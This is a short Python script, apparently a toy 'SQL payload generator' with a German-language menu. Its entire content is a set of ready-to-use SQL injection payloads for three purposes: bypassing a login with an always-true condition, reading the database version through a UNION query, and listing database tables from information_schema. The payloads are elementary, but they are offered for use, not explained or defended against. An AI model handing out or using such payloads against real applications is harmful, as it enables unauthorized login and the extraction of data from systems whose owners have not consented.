def generate():
    print("\n[💉 SQL-Payload-Generator]")
    print("[1] Basic Bypass (Login)")
    print("[2] Datenbank-Info")
    print("[3] Tabellen auslesen")
    choice = input(">>> ")

    if choice == "1":
        print("✅ Payload: ' OR '1'='1'--")
    elif choice == "2":
        print("✅ Payload: ' UNION SELECT 1,@@version,3--")
    elif choice == "3":
        print("✅ Payload: ' UNION SELECT 1,table_name,3 FROM information_schema.tables--")
    else:
        print("❌ Ungültige Option!")
